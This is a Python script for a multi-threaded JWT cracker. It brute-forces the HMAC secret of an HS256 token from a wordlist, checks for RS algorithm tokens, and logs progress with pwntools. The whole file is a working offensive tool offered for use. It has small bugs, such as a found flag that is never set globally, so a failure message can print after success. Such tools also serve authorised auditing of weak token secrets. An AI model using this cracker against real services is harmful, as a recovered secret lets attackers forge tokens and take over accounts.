# Multi Threaded JWT Cracker

import jwt
import argparse
from concurrent.futures import ThreadPoolExecutor
import time
from os import _exit
from os import system
import base64

parser = argparse.ArgumentParser(epilog='(M)ulti (T)hreaded (J)WT (C)racker')

parser.add_argument('--cookie', '-c', required=True, help='JWT token to crack (HS256)')
parser.add_argument('--wordlist', '-w', required=True, help='wordlist to use')
parser.add_argument('--threads', '-t', default=100, type=int, help='threads to work with (default: 100)')
parser.add_argument('--verbose', '-v', action='store_true', help="verbose the bruteforce attempts (affects the script's performance)")
parser.add_argument('--force', action='store_true', help="forces the bruteforcer to continue despite the (invalid base64 error)  ")
args = parser.parse_args()

try:

	cookie_check = base64.urlsafe_b64decode(args.cookie)

	if 'RS' in cookie_check.decode('latin1'):
		from pwn import log	
		print('\n')
		log.critical('recieved an (RS) algorithm while excepted (HS) algorithm')
		exit()

except Exception as e:
	if str(e) == 'Incorrect padding':	
		from pwn import log
		print('\n')
		log.critical('got an (Incorrect padding) error, passing the algorithm check')
		print('\n')
	if 'Invalid base64-encoded string' in  str(e) :
		from pwn import log
		if not args.force:
			print('\n')
			log.critical('got (Invalid base64-encoded string) error, the cookie is most likely (RS) instead of (HS)')
			log.info('if you want to continue anyway use (--force) flag')
			exit()
		if args.force:
			print('\n')
			log.warning('flag (--force) is used, ignoring base64 errors')
			print('\n')



secret_list = open(args.wordlist, 'r', encoding='latin1').readlines()
secrets = [s.strip() for s in secret_list]

print(f'[*] using wordlist: {args.wordlist}')
print(f'[*] using {len(secret_list)} secrets\n')

if not args.verbose:
	from pwn import log
	progress = log.progress('')
	progress.status('Bruteforcing')

FOUND = False


start = time.perf_counter()
def cracker(jwt_token, secret):
	try:

		if args.verbose:
			print(f'attempt: {secret}')


		if jwt.decode(args.cookie, secret):
			finish = time.perf_counter()
			FOUND = True
			print(f'\n[*] cracked: {secret}')
			print(f'[*] finished in {round(finish - start)} second(s)')
			if not args.verbose:
				system('tset') # using (tset) utility to reset to terminal (pwntools log module messes the standard output)
			_exit(1)


	except jwt.exceptions.InvalidSignatureError:
		pass
	except jwt.exceptions.ExpiredSignatureError:
		from pwn import log	
		print('\n')
		log.critical('check the (exp) value in the cookie\'s payload or remove it entirely')
		log.error('expired signature error')
		
		


with ThreadPoolExecutor(args.threads) as ex:
	result = [ex.submit(cracker, args.cookie, secret) for secret in secrets]



if not FOUND:
	print('\n')
	from pwn import log
	log.failure('secret did not found')

